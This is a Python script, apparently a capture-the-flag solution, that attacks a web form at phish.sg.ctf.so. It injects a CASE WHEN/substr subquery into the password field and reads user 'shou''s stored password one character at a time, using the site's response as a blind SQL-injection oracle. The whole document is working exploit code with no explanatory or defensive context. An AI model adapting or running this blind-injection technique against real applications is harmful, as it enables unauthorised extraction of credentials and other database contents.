import requests
import string

url = 'http://phish.sg.ctf.so/add'
chars = string.printable
leaked = ''


def make_username(user):
    username = 'blahblahblah' + str(user)
    return username.replace('0', 'X')


for i in range(1, 100):
    u = make_username(i)
    for c in chars:
        post_data = {
            'username': 'test',
            'password': f'''pswd', CASE WHEN substr((SELECT password FROM user WHERE username = 'shou'),{i}, 1) = '{c}' THEN "{u}" ELSE "shou" END); --'''
        }
        res = requests.post("http://phish.sg.ctf.so/add", data=post_data)
        if "Your password is leaked" in res.text:
            print(c)
            leaked += c
            break


print(leaked)
